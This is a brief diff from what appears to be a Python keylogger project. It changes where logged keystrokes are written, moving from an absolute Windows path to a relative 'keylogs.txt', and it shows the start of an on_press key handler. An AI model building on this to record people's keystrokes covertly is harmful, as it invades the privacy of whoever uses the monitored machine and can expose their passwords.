@@ -4,7 +4,7 @@ import logging
 
 logs = ""
 
-logging.basicConfig(filename=(logs + "D:\Project\Keylogger\keylogs.txt"), \
+logging.basicConfig(filename=(logs + "keylogs.txt"), \
 	level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
